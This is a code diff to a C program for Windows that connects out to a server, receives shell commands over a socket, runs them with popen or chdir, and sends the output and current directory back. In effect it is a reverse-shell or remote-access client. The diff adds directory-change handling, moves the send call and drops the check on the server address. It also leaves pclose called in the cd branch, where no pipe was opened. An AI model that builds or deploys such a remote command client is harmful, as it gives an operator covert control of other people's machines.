@@ -37,9 +37,16 @@ int main(){
         memset(output_buff, 0, 1024);
         receiveCommand(client_socket, cmd_buff);
         printf("%s\n", cmd_buff);
+
         char* command = strtok(cmd_buff, " ");
         if (strcmp(command, "cd") == 0){
             // code for if the command was cd
+            strcpy(cwd, &cmd_buff[3]);
+            chdir(cwd);
+            getcwd(cwd, 1024);
+            strcat(output_buff, "\n");
+            strcat(output_buff, "cURR_dIR");
+            strcat(output_buff, cwd);
         } else {
             // code for any other command aside from cd
             output = popen(cmd_buff, "r"); 
@@ -51,12 +58,13 @@ int main(){
                 }
                 strcat(output_buff, line);
             }
+            getcwd(cwd, 1024);
             strcat(output_buff, "cURR_dIR");
             strcat(output_buff, cwd);
             // printf("output buffer: %s\n", output_buff);
-            sendMsg(client_socket, output_buff);
-            pclose(output);
         }
+        sendMsg(client_socket, output_buff);
+        pclose(output);
     }
     return 1;
 }
@@ -82,13 +90,7 @@ SOCKET startSocket() {
 }
 
 void connectToServer(struct sockaddr_in *serv_addr, SOCKET client_socket, const char* server_ip) {
-
-    if (inet_pton(AF_INET, server_ip, &serv_addr->sin_addr) <= 0) {
-        printf("\nInvalid address/ Address not supported \n");
-        closesocket(client_socket);
-        WSACleanup();
-        exit(EXIT_FAILURE);
-    } 
+    inet_pton(AF_INET, server_ip, &serv_addr->sin_addr);
     if (connect(client_socket, (struct sockaddr *)serv_addr, sizeof(*serv_addr)) < 0) {
         printf("\nConnection Failed. \n");
         printf("%i", client_socket);
